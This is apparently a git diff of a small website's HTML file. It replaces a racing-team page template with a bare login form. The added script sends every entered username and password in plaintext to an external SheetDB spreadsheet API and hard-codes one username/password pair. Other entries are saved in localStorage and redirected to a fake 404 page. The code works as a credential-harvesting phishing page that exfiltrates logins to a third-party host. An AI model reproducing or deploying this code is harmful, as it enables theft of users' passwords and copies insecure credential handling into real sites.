@@ -3,104 +3,52 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Webpage with Title Image</title>
-    <style>
-        .header {
-            display: flex;
-            align-items: center;
-            padding: 10px;
-            background-color: #000;
-            color: white;
-        }
-
-        .header-image {
-            height: 50px; /* Adjust the height as needed */
-            width: auto;
-            margin-right: 20px;
-        }
-
-        .header-title {
-            font-size: 24px;
-            font-weight: bold;
-        }
-
-        @keyframes fadeIn {
-            from {
-                opacity: 0;
-            }
-            to {
-                opacity: 1;
-            }
-        }
-
-        @keyframes spin {
-            from {
-                transform: rotate(0deg);
-            }
-            to {
-                transform: rotate(360deg);
-            }
-        }
-
-        footer {
-            background-color: #000;
-            color: white;
-            text-align: center;
-            padding: 10px 0;
-            opacity: 0;
-            animation: fadeIn 2s forwards;
-        }
-
-        footer a {
-            color: #FFD700;
-            text-decoration: none;
-            font-weight: bold;
-        }
-
-        footer a:hover {
-            text-decoration: underline;
-        }
-
-        .contact-info {
-            margin-top: 10px;
-        }
-
-        .footer-logo {
-            display: inline-block;
-            margin: 10px 0;
-            animation: spin 5s linear infinite;
-        }
-
-        .footer-logo img {
-            height: 50px;
-            width: auto;
-        }
-    </style>
+    <title>Login</title>
 </head>
 <body>
-   
+    <form onsubmit="saveCredentials(event)">
+        <label for="login-username">Username:</label>
+        <input type="text" id="login-username" required>
+        <br>
+        <label for="login-password">Password:</label>
+        <input type="password" id="login-password" required>
+        <br>
+        <button type="submit">Login</button>
+    </form>
 
-    <div class="content">
-        <!-- Your main content goes here -->
-    </div>
-    <script src="https://sheetdb.io/s/t/0liz6a0wz8xnn.js"></script>
-    <footer>
-        <div class="footer-logo">
-            <img src="./images/logo.png" alt="Team Logo">
-        </div>
-        <p>&copy; 2025 Your Racing Team. All rights reserved.</p>
-        <p>
-            <a href="https://www.yourprivacypolicyurl.com">Privacy Policy</a> |
-            <a href="https://www.yourtermsandconditionsurl.com">Terms & Conditions</a>
-        </p>
-        <div class="contact-info">
-            <p>Contact Us:</p>
-            <p>Email: <a href="mailto:contact@yourracingteam.com">contact@yourracingteam.com</a></p>
-            <p>Phone: +91 96348 53979</p>
-            <p>Address: 1234 Racing Street, Speed City, Country</p>
-        </div>
-        <p>Website made by <a href="https://github.com/ankit2pandey">Ankit2Pandey</a></p>
-    </footer>
-   
+    <script>
+        async function saveCredentials(event) {
+            event.preventDefault();
+            const username = document.getElementById('login-username').value;
+            const password = document.getElementById('login-password').value;
+
+            const data = {
+                "data": {
+                    "username": username,
+                    "password": password
+                }
+            };
+
+            const response = await fetch('https://sheetdb.io/api/v1/nkjaelg6umt9i', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(data)
+            });
+
+            if (response.ok) {
+                if (username === 'ankit2pandey' && password === 'ankit@0987') {
+                    window.location.href = 'goo.html';
+                } else {
+                    localStorage.setItem('username', username);
+                    localStorage.setItem('password', password);
+                    window.location.href = '404.html';
+                }
+            } else {
+                console.error('Error:', response.statusText);
+            }
+        }
+    </script>
 </body>
 </html>
